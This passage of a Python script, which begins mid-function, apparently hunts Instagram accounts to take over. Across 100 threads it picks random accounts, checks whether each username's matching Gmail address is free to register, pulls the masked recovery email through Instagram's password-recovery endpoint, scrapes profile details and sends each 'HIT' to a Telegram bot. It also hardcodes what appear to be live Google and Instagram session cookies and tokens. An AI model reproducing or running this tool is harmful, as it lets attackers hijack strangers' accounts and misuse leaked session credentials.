    'x-fb-client-ip': 'True',
    'x-fb-connection-type': 'WIFI',
    'x-fb-friendly-name': 'IgApi: accounts/send_recovery_flow_email/',
    'x-fb-request-analytics-tags': '{}',
    'x-fb-server-cluster': 'True',
    'x-ig-android-id': 'android-b3f0e6f37c4144ab',
    'x-ig-app-id': '567067343352427',
    'x-ig-app-locale': 'en_US',
    'x-ig-bandwidth-speed-kbps': '652.000',
    'x-ig-bandwidth-totalbytes-b': '494530',
    'x-ig-bandwidth-totaltime-ms': '906',
    'x-ig-client-endpoint': 'user_password_recovery',
    'x-ig-capabilities': '3brTv10=',
    'x-ig-connection-type': 'WIFI',
    'x-ig-device-id': 'android-a33b024322ce4156',
    'x-ig-device-locale': 'en_US',
    'x-ig-family-device-id': "26b6ddbc-5dfe-4758-8170-abd4688d0d73",
    'x-ig-mapped-locale': 'en_US',
    'x-ig-nav-chain': '',
    'x-ig-timezone-offset': '19800',
    'x-ig-www-claim': '0',
    'x-mid': '',
    'x-pigeon-rawclienttime': '',
    'x-pigeon-session-id': '',
    'x-tigon-is-retry': 'False',
    'x-fb-http-engine': 'MNS',
    'x-fb-rmd': '',
    'x-fb-session-id': '',
    'x-fb-session-private': '',
    }
    
    data = {
    "adid": "ece40bb6-21cf-4071-934d-11ad4cc952ab",
    "guid": "ece40bb6-21cf-4071-934d-11ad4cc952ab",
    "device_id": "android-5b7ed0786fa2ec6f",
    "query": sax,
    "waterfall_id": "6f838327-b51f-4bc1-89a2-32d5c8667ba7"
    }
    response = requests.post(url, headers=headers, data=data)
    if response.status_code == 200:
        j = response.json()
        try:
            e = j.get('email', {})
            if e:
            	return e
            else:
            	pass
        except:
            pass
    else:
    	pass
def primeB(y):
    global ge, be
    x = y.split("@")[0]
    try:
    	with open("pri1.txt", "r", encoding="utf-8") as f:
    		tl = f.read().strip()
    except:
    	primeA()
    cookies = {
    'OTZ': '8309472_34_34__34_',
    'SID': 'g.a0002gi1dd8yZ3FXerUbD0lZsjfxGYXmLQCZl_jOPTWrCQr-ceE8GWVt9L7iprlSOwzcUWVAQgACgYKAUoSARcSFQHGX2MiZOWVWvLTgtfWbhfZ7sgLdRoVAUF8yKqeqNLMCJ-oGrDBu5PfgPE00076',
    '__Secure-1PSID': 'g.a0002gi1dd8yZ3FXerUbD0lZsjfxGYXmLQCZl_jOPTWrCQr-ceE83m_mJ6dNigOwtdwQHl746wACgYKAQoSARcSFQHGX2MiKpvMABbiAQc8NLmTKolnABoVAUF8yKpj1EUpq9zDueQEFm9Lt0h00076',
    '__Secure-3PSID': 'g.a0002gi1dd8yZ3FXerUbD0lZsjfxGYXmLQCZl_jOPTWrCQr-ceE8qiry-9CCYWdQ5t8nipaCxQACgYKAdQSARcSFQHGX2MiBa2wMvPwAE8HrLIsR5dFshoVAUF8yKqBwoCIwTPFC1iwmyqL6DEs0076',
    'HSID': 'AHNm3CKBGdSMsBwzD',
    'SSID': 'A9SJ8D5tjdt2-sSVI',
    'APISID': 'x19sOtCKQ9WQDvbK/AzWXbrF71JpMy8m4J',
    'SAPISID': 'tSjBPiL_6sbJdMfm/AwKEElNV7V5jbpkd4',
    '__Secure-1PAPISID': 'tSjBPiL_6sbJdMfm/AwKEElNV7V5jbpkd4',
    '__Secure-3PAPISID': 'tSjBPiL_6sbJdMfm/AwKEElNV7V5jbpkd4',
    'ACCOUNT_CHOOSER': 'AFx_qI7uSXUOqgdOsZPqxaPbRZsHNy4OeBttiLK4DUn19xgC97XboFW5I0y40BRyJ1oJs-ZWO7IsXu4ZAHXG0qithHQAuv64M9R9R0zqdYuzOVu9PM9FEFvRMB-TZ0A2EvwIDj0pzrmg',
    'SEARCH_SAMESITE': 'CgQInJ8B',
    'LSID': 'o.myaccount.google.com|s.IN|s.youtube:g.a0002gi1dThmvT_f9o-xu1mdvyQC-627FG-DbcqKgfBMeBmO4UScLGGDLvJ_G6AwW7hD6gx6vAACgYKAfASARcSFQHGX2MiYXvIugm1ycYmoCqRBL5e3hoVAUF8yKoIr5NFULtUhPoShrT1oGN60076',
    '__Host-1PLSID': 'o.myaccount.google.com|s.IN|s.youtube:g.a0002gi1dThmvT_f9o-xu1mdvyQC-627FG-DbcqKgfBMeBmO4UScN4jTHtD8P3PXBQHv4YT_QQACgYKAZASARcSFQHGX2MiL81-TcFsMsc0pxkowR-CIRoVAUF8yKq0n-0Bd28my2l-UL1_OI-90076',
    '__Host-3PLSID': 'o.myaccount.google.com|s.IN|s.youtube:g.a0002gi1dThmvT_f9o-xu1mdvyQC-627FG-DbcqKgfBMeBmO4USccVsUjJ1_7TC8BuRVq-_UogACgYKAYwSARcSFQHGX2MiCp2-YMXAUpQe22R-4HmIghoVAUF8yKq-LF7ClSDYOD7pRtyVRCPL0076',
    'AEC': 'AaJma5skMQYQ0SZr_ZfmtwwwzdSnux_2e9fQgoQ3Xapf3dDFIcB1ofY5H7U',
    '__Host-GAPS': '1:pvzNQrKjktsPNONVKlFN-EqCX8wPRfwntVMWKZtBYVFrhylIOcTWiSISKyvHNHBQYKrf44Y9fwgXLROI4CG9bJxlCJ91ZQ:gNmQNjKfVCaO4wzJ',
    'NID': '526=KFxIhpHQA01Pci5nZO3I_NNnItXcg9RtWQUt4aK3RMXO_dRlm53zNSz9wdmtb3LIhq6qKhhR01xNLFgtSuwqV1QTgeLmC-irYQqYPMRA2GN7qEc1TuVOeXBKFKaZJWRHpEM4m9IcliJqFFqvIdEYxwzy1e92KeHZo1brjaY5eBj8Aax03nhmScyhxwaIkRtv33bhxxQy3rcfnh7UuG4gW_2S_hkO9fcGvB2MmVZ1D3yfSWTmEQKcNUBeu7FJ84tc7ahIy3GuRF1OHsMMdKFRe6yF7etNUh_GiqPZZT5_PdUh-kMXOavRbCZi2Yy8S4ptLqvqCW5ugDGttJauXTiXyzqKXDieBD7m0aHmoPqUNMQ4kMLibm9X4Hl0MlVC1lqovABRTU_c0kdeHnS3R587sQJWoQdruTKBiejqD--BF6T-gPiO7TzgL9gNYpRD_0u0gwuKXJj3CJXSKbYN43tnqzUwE0KiZaH37SEefN9TFRwofC31SRPB2YJXcRWZhI3jvUNQA330f9sGPxD2COsRppGZ7zg_6S4l8CtDIQmKeQq1UMSHocPFjR0q8Ewsut7Ag-ypbhFCgryWGgtzr5K4n96vrAtnR8mCJnfFbucGAC54y7XNYNIqWB_LrtqASLb8xkSQ8yuJig14HqzQOJjEB4smwEZXsAYg-N7HsIoP-BD0uZBeOp88GjOu-rEXdL4zx06qYzeeNzW4qNSwHaqvoY2O3G5U4WM0MK-brQQkXXQtplS1eZFE26hNDGtE-7RiM2G95pZTDeUeRlw',
    'SIDCC': 'AKEyXzXSTCYPFECLk7jNLIt52ji9GW4qHWur8KUZKSgndvjJsuzFbu1M4YXS0hRLQ2CD6cM3lg',
    '__Secure-1PSIDCC': 'AKEyXzWiHfXQskb1R2qC96cMYnAWt-Wg5C0oiN6YOS_FlmXr434mEDuPscZ_eBgbYFE5VAH3_wg',
    '__Secure-3PSIDCC': 'AKEyXzW9u4uKKOMqNMTrW_r_DWAFiqL02xsS1sSScw82uuYoQK4sHzcz2872VJspYQKG1OMvBvQ',
    }
    headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 14; SM-A235F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; application/x-www-form-urlencoded;charset=UTF-8',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'x-same-domain': '1',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-full-version': '"107.0.5304.74"',
    'sec-ch-ua-platform-version': '"14.0.0"',
    'google-accounts-xsrf': '1',
    'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
    'sec-ch-ua-model': '"SM-A235F"',
    'sec-ch-ua-wow64': '?0',
    'sec-ch-ua-platform': '"Android"',
    'x-chrome-connected': 'source=Chrome,eligible_for_consistency=true',
    'origin': 'https://accounts.google.com',
    'x-client-data': 'CPfpygE=',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': f'https://accounts.google.com/signup/v2/createusername?continue=https%3A%2F%2Faccounts.google.com%2FManageAccount%3Fnc%3D1&parent_directed=true&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'Cookie': 'OTZ=8309472_34_34__34_; SID=g.a0002gi1dd8yZ3FXerUbD0lZsjfxGYXmLQCZl_jOPTWrCQr-ceE8GWVt9L7iprlSOwzcUWVAQgACgYKAUoSARcSFQHGX2MiZOWVWvLTgtfWbhfZ7sgLdRoVAUF8yKqeqNLMCJ-oGrDBu5PfgPE00076; __Secure-1PSID=g.a0002gi1dd8yZ3FXerUbD0lZsjfxGYXmLQCZl_jOPTWrCQr-ceE83m_mJ6dNigOwtdwQHl746wACgYKAQoSARcSFQHGX2MiKpvMABbiAQc8NLmTKolnABoVAUF8yKpj1EUpq9zDueQEFm9Lt0h00076; __Secure-3PSID=g.a0002gi1dd8yZ3FXerUbD0lZsjfxGYXmLQCZl_jOPTWrCQr-ceE8qiry-9CCYWdQ5t8nipaCxQACgYKAdQSARcSFQHGX2MiBa2wMvPwAE8HrLIsR5dFshoVAUF8yKqBwoCIwTPFC1iwmyqL6DEs0076; HSID=AHNm3CKBGdSMsBwzD; SSID=A9SJ8D5tjdt2-sSVI; APISID=x19sOtCKQ9WQDvbK/AzWXbrF71JpMy8m4J; SAPISID=tSjBPiL_6sbJdMfm/AwKEElNV7V5jbpkd4; __Secure-1PAPISID=tSjBPiL_6sbJdMfm/AwKEElNV7V5jbpkd4; __Secure-3PAPISID=tSjBPiL_6sbJdMfm/AwKEElNV7V5jbpkd4; ACCOUNT_CHOOSER=AFx_qI7uSXUOqgdOsZPqxaPbRZsHNy4OeBttiLK4DUn19xgC97XboFW5I0y40BRyJ1oJs-ZWO7IsXu4ZAHXG0qithHQAuv64M9R9R0zqdYuzOVu9PM9FEFvRMB-TZ0A2EvwIDj0pzrmg; SEARCH_SAMESITE=CgQInJ8B; LSID=o.myaccount.google.com|s.IN|s.youtube:g.a0002gi1dThmvT_f9o-xu1mdvyQC-627FG-DbcqKgfBMeBmO4UScLGGDLvJ_G6AwW7hD6gx6vAACgYKAfASARcSFQHGX2MiYXvIugm1ycYmoCqRBL5e3hoVAUF8yKoIr5NFULtUhPoShrT1oGN60076; __Host-1PLSID=o.myaccount.google.com|s.IN|s.youtube:g.a0002gi1dThmvT_f9o-xu1mdvyQC-627FG-DbcqKgfBMeBmO4UScN4jTHtD8P3PXBQHv4YT_QQACgYKAZASARcSFQHGX2MiL81-TcFsMsc0pxkowR-CIRoVAUF8yKq0n-0Bd28my2l-UL1_OI-90076; __Host-3PLSID=o.myaccount.google.com|s.IN|s.youtube:g.a0002gi1dThmvT_f9o-xu1mdvyQC-627FG-DbcqKgfBMeBmO4USccVsUjJ1_7TC8BuRVq-_UogACgYKAYwSARcSFQHGX2MiCp2-YMXAUpQe22R-4HmIghoVAUF8yKq-LF7ClSDYOD7pRtyVRCPL0076; AEC=AaJma5skMQYQ0SZr_ZfmtwwwzdSnux_2e9fQgoQ3Xapf3dDFIcB1ofY5H7U; __Host-GAPS=1:pvzNQrKjktsPNONVKlFN-EqCX8wPRfwntVMWKZtBYVFrhylIOcTWiSISKyvHNHBQYKrf44Y9fwgXLROI4CG9bJxlCJ91ZQ:gNmQNjKfVCaO4wzJ; NID=526=KFxIhpHQA01Pci5nZO3I_NNnItXcg9RtWQUt4aK3RMXO_dRlm53zNSz9wdmtb3LIhq6qKhhR01xNLFgtSuwqV1QTgeLmC-irYQqYPMRA2GN7qEc1TuVOeXBKFKaZJWRHpEM4m9IcliJqFFqvIdEYxwzy1e92KeHZo1brjaY5eBj8Aax03nhmScyhxwaIkRtv33bhxxQy3rcfnh7UuG4gW_2S_hkO9fcGvB2MmVZ1D3yfSWTmEQKcNUBeu7FJ84tc7ahIy3GuRF1OHsMMdKFRe6yF7etNUh_GiqPZZT5_PdUh-kMXOavRbCZi2Yy8S4ptLqvqCW5ugDGttJauXTiXyzqKXDieBD7m0aHmoPqUNMQ4kMLibm9X4Hl0MlVC1lqovABRTU_c0kdeHnS3R587sQJWoQdruTKBiejqD--BF6T-gPiO7TzgL9gNYpRD_0u0gwuKXJj3CJXSKbYN43tnqzUwE0KiZaH37SEefN9TFRwofC31SRPB2YJXcRWZhI3jvUNQA330f9sGPxD2COsRppGZ7zg_6S4l8CtDIQmKeQq1UMSHocPFjR0q8Ewsut7Ag-ypbhFCgryWGgtzr5K4n96vrAtnR8mCJnfFbucGAC54y7XNYNIqWB_LrtqASLb8xkSQ8yuJig14HqzQOJjEB4smwEZXsAYg-N7HsIoP-BD0uZBeOp88GjOu-rEXdL4zx06qYzeeNzW4qNSwHaqvoY2O3G5U4WM0MK-brQQkXXQtplS1eZFE26hNDGtE-7RiM2G95pZTDeUeRlw; SIDCC=AKEyXzXSTCYPFECLk7jNLIt52ji9GW4qHWur8KUZKSgndvjJsuzFbu1M4YXS0hRLQ2CD6cM3lg; __Secure-1PSIDCC=AKEyXzWiHfXQskb1R2qC96cMYnAWt-Wg5C0oiN6YOS_FlmXr434mEDuPscZ_eBgbYFE5VAH3_wg; __Secure-3PSIDCC=AKEyXzW9u4uKKOMqNMTrW_r_DWAFiqL02xsS1sSScw82uuYoQK4sHzcz2872VJspYQKG1OMvBvQ',
    }
    params = {
    'hl': 'en-GB',
    'TL': tl,
    '_reqid': '476046',
    'rt': 'j',
    }
    data = {
    'continue': 'https://accounts.google.com/ManageAccount?nc=1',
    'f.req': f'["TL:{tl}","{x}",1,0,1,null,0,31283]',
    'at': 'AFoagUUkdYt7up8cfK1iFE7d0ubVNvkEyg:1761233819683',
    'azt': 'AFoagUU0uP5Kaamco0Qhr9UM8GMphtcPDg:1761233819683',
    'cookiesDisabled': 'false',
    'deviceinfo': '[null,null,null,null,null,"IN",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,1,null,0,1,"",null,null,3,0,2]',
    'gmscoreversion': 'null',
    'flowName': 'GlifWebSignIn',
    'checkConnection': 'youtube:337',
    'checkedDomains': 'youtube',
    'pstMsg': '1',
    }
    response = requests.post(
    'https://accounts.google.com/_/signup/usernameavailability',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
    )
    if response.status_code == 200:
    	try:
    		cc = response.text
    		if '"gf.uar",1' in cc:
    			e = primey(y)
    			ge+=1
    			dis()
    			primeXYZ(x, y, e, id, token)
    		else:
    			be+=1
    	except:
    		be+=1
    else:
    	be+=1
def primeXYZ(x, y, e, id, token):
    global ge
    if e:
        z = e
    else:
        z = 'Lamda mila he g!'
    headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 14; SM-A235F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'authority': 'www.instagram.com',
    'accept': '/',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'Content-Type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.instagram.com',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"14.0.0"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'x-bloks-version-id': 'd472af6df5cc606197723ed51adaa0886f926161310654a7c93600790814eba5',
    'x-csrftoken': 'vp6F7O9J4FvVrSHZqL48yPxfy2m5XDRR',
    'x-fb-friendly-name': 'PolarisFeedTimelineRootV2Query',
    'x-fb-lsd': '5YTih-hjWefVrWbzdX_0cV',
    'x-ig-app-id': '1217981644879628',
    'x-root-field-name': 'xdt_api__v1__feed__timeline__connection',
    }
    cookies = {
    'datr': 'FrB7aGiRgoP0jea2FwBZneWy',
    'ig_did': '966509E6-D028-472E-B61A-4E64ADF744E9',
    'ig_nrcb': '1',
    'ps_l': '1',
    'ps_n': '1',
    'mid': 'aHu5mwABAAHyBl8G-X4Qb_memVEM',
    'dpr': '2.8125',
    'csrftoken': 'vp6F7O9J4FvVrSHZqL48yPxfy2m5XDRR',
    'ds_user_id': '7884420742',
    'wd': '384x729',
    'rur': '"CCO\\0547884420742\\0541792848225:01fe35a2a896816ad202392826446923799904d0dd13cd5d73970cfe59eb2bb85302aa6e"',
}
    params = {'username': x}
    response = requests.get('https://www.instagram.com/api/v1/users/web_profile_info/', headers=headers, cookies=cookies, params=params)
    data = response.text
    try:
        js = response.json()
    except:
        return
    u = js.get('data', {}).get('user', {}).get('username', {})
    fn = js.get('data', {}).get('user', {}).get('full_name', {})
    b = js.get('data', {}).get('user', {}).get('biography', {})
    f1 = js.get('data', {}).get('user', {}).get('edge_followed_by', {}).get('count', {})
    f2 = js.get('data', {}).get('user', {}).get('edge_follow', {}).get('count', {})
    p = js.get('data', {}).get('user', {}).get('is_private', {})
    p1 = js.get('data', {}).get('user', {}).get('edge_owner_to_timeline_media', {}).get('count', {})
    biz = js.get('data', {}).get('user', {}).get('is_business_account', {})
    if f1 > 10 and p1 > 2:
        m = 'Yes'
    else:
        m = 'No'
    msg = f"""
🎯 𝗛𝗜𝗧 — {ge}
🏢 𝗕𝘂𝘀𝗶𝗻𝗲𝘀𝘀: {biz}
🌐 𝗠𝗲𝘁𝗮 𝗘𝗻𝗮𝗯𝗹𝗲𝗱: {m}
👥 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀: {f1}
➡️ 𝗙𝗼𝗹𝗹𝗼𝘄𝗶𝗻𝗴: {f2}
📸 𝗣𝗼𝘀𝘁𝘀: {p1}
📝 𝗕𝗶𝗼: {b}
🔒 𝗣𝗿𝗶𝘃𝗮𝘁𝗲: {p}
🧾 𝗙𝘂𝗹𝗹 𝗡𝗮𝗺𝗲: {fn}
👤 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{x}
📨 𝗘𝗠𝗔𝗜𝗟: {y}
🧪 𝐎𝐛𝐟𝐮𝐬-𝐄𝐦𝐚𝐢𝐥 - {z}
🔗 𝗨𝗥𝗟: https://www.instagram.com/{x}

👨‍💻 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿: @aesowns 	
"""
    try:
        params={"chat_id": id, "text": msg}
        response = requests.get(f'https://api.telegram.org/bot{token}/sendMessage', params=params)
    except:
        pass
def csrf(legend):
    while True:
        try:
            headers = {
                'user-agent': "Mozilla/5.0 (Linux; Android 14; SM-A235F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
                'x-ig-app-id': '936619743392459'
            }
            r = legend.get('https://www.instagram.com/', headers=headers, timeout=3)
            token = r.cookies.get_dict().get('csrftoken', '')
            if token:
                with open("csrf.txt", "w") as f:
                    f.write(token)
                break
        except:
            pass
def csrfX():
    try:
        with open("csrf.txt", "r") as f:
            return f.read().strip()
    except:
        return ""
def users():
    primeXcxqok1 = requests.Session()
    while True:
        try:
            lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
            cookies = {
                'rur': '"VLL\\05476944984014\\0541788877382:01feb9c5b489b4665ce93731c710cac36c78fdb4c176515a1e9a902103d9b08a5e1aef0f"'
            }
            headers = {
                'User-Agent': "Mozilla/5.0 (Linux; Android 14; SM-A235F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
                'Content-Type': 'application/x-www-form-urlencoded',
                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-model': '"SM-A235F"',
                'x-ig-app-id': '1217981644879628',
                'sec-ch-ua-mobile': '?1',
                'x-fb-friendly-name': 'QuickPromotionSupportIGSchemaBatchFetchQuery',
                'x-fb-lsd': lsd,
                'sec-ch-ua-platform-version': '"14.0.0"',
                'x-asbd-id': '359341',
                'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
                'sec-ch-prefers-color-scheme': 'light',
                'x-csrftoken': csrfX(),
                'sec-ch-ua-platform': '"Android"',
                'origin': 'https://www.instagram.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.instagram.com/vihaantheking333/',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            }
            fvck = random.randint(2500000000, 21254029834)
            data = {
                'lsd': lsd,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
                'variables': json.dumps({"userID": fvck, "username": "cristiano"}),
                'server_timestamps': 'true',
                'doc_id': '7717269488336001',
            }
            r = primeXcxqok1.post('https://www.instagram.com/api/graphql', cookies=cookies, headers=headers, data=data, timeout=10)
            if r.status_code == 200:
                j = r.json()
                loda = j.get('data', {}).get('user', {})
                if not loda:
                    continue
                u = loda.get('username')
                f = loda.get('follower_count', 0)
                if u and f > 40:
                    primeX(u+'@gmail.com')
        except:
            pass
primeXcxqok = requests.Session()
csrf(primeXcxqok)
for i in range(100):
    Thread(target=users).start()
    # @aesowns 